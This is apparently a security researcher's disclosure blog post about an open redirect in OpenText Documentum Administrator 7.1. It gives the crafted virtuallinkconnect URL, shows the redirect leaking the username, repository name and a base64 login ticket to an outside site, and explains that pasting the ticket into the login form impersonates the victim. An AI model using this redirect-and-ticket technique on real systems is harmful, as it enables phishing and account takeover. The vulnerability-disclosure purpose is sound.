---
layout: post
title: "Open redirect with authentication in OpenText Documentum"
thumbnail: railways-240.jpg
date: 2017-10-11
---

Documentum is an enterprise content management platform in which it is possible to upload and share documents. 

## Open redirect

If you visit some non-existing URL under Documentum Administrator 7.1, it redirects you to the virtuallinkconnect page. For example, if you visit http://localhost:8080/da/helloworld, you are redirected to the following URL:

    http://localhost:8080/da/component/virtuallinkconnect?redirectUrl=%2Fda%2Fhelloworld&virtualLinkPath=%2Fhelloworld

This is supposedly part of the virtual link functionality. A virtual link is a link to document with authentication included. This way you can send a link to your coworker and he can access that document because the link contains an access token. The documentation says this about the parameters to virtuallinkconnect:

* redirectUrl - (Required) URL to be displayed when the object cannot be located in the repository.  
* virtualLinkPath - (Required) URL to the feature that provides anonymous access, which allows the use of predefined login credentials (per repository) instead of requiring a user to log in using their credentials.

So the virtuallinkconnect page tries to look up the given virtualLinkPath, and redirects to redirectUrl if that fails. This is a good point to test for an [open redirect](https://cwe.mitre.org/data/definitions/601.html). An open redirect is a page that redirects the user to another site. This can be used in a phishing attack so that a seemingly trustworthy link to legit.com actually redirects to attacker.com.

To test this, we fill in a full URL in redirectUrl, any anything that does not exist in virtualLinkPath:

    http://localhost:8080/da/component/virtuallinkconnect?redirectUrl=https://www.sjoerdlangkemper.nl/&virtualLinkPath=1

This indeed redirects to https://www.sjoerdlangkemper.nl/, confirming that this is an open redirect without any validation on the redirectUrl parameter.

## With authentication credentials

Besides simply redirecting, it passes a couple of parameters along with the redirect. The full URL that it redirects to is this:

    https://www.sjoerdlangkemper.nl/?docbase=MyRepo.MyRepo&domain=&username=sjoerd&ticket=DM_TICKET%3DT0JKIE5VTEwgMAoxMwp2ZXJzaW9uIElOVCBTIDAKMwpmbGFncyBJTlQgUyAwCjEKc2VxdWVuY2VfbnVtIElOVCBTIDAKMTYKY3JlYXRlX3RpbWUgSU5UIFMgMAoxNDk1NjMwNTM3CmV4cGlyZV90aW1lIElOVCBTIDAKMTQ5NTYzMDgzNwpkb21haW4gSU5UIFMgMAowCnVzZXJfbmFtZSBTVFJJTkcgUyAwCkEgNiBzam9lcmQKcGFzc3dvcmQgU1RSSU5HIFMgMApBIDEwOCBETV9FTkNSX1RFWFRfVjI9QUFBQUVCeDQ3NXJnQWVoU01xWWJheWYvcm5VdVNVaEdaODcwbWtobGhTOVVOcUZCZGNFMzRTNU5zZTRjUTNtL0JlVnRqUG5qODR4eGQ3RGlXUHR5Mm1jUVZ3ND0KZG9jYmFzZV9uYW1lIFNUUklORyBTIDAKQSA2IE15UmVwbwpob3N0X25hbWUgU1RSSU5HIFMgMApBIDExIGRlbW8tc2VydmVyCnNlcnZlcl9uYW1lIFNUUklORyBTIDAKQSA2IE15UmVwbwpzaWduYXR1cmVfbGVuIElOVCBTIDAKMTEyCnNpZ25hdHVyZSBTVFJJTkcgUyAwCkEgMTEyIEFBQUFFTzh5M2xvQnl2OHIvS3lIY1ZXdmdWOENIdE5Mc3g5K1dxdVV0d2dxeG9HcE5uOVhuRTZNS3N3NWJNWTB5YkdhS29BdytIZ2V4WmFNN29OaU55ZURoRFRkaDZYcWQzSjVFMkVrRWdMbCt6R2EK&rootpaths=%2F

The virtuallinkconnect adds several query parameters:

* `docbase`, the name of our Documentum repository,
* `domain`, always empty,
* `username`, our Documentum username,
* `ticket`, a base64-encoded authentication token,
* `rootpaths`, some configured paths.

These parameters are only added if an option called "secure vlinks" is disabled. If it is enabled, all these values are passed to the next page through the session and not through GET parameters. The documentation says

> If secure vlink deployment is enabled,
  vlink and webtop will communicate using HTTPSession.
  Hence, they cannot be deployed as different web applications.
  If secure vlink deployment is disabled,
  vlink and webtop will communicate using HTTP(S) GET.
  In this case, they can be deployed as different web applications in the application server.

Assuming secure vlinks is disabled, your username, docbase name and ticket are sent to a third-party web site if you can be tricked in visiting a link. This ticket is particularly interesting, because it contains some authentication token. It turns out it is quite easy to use to authenticate as another user. Just paste the ticket value in the password field at the login page. 

![Documentum Administrator login](/images/documentum-administrator-login.png)

So this open redirect send valid login credentials to a third party website.
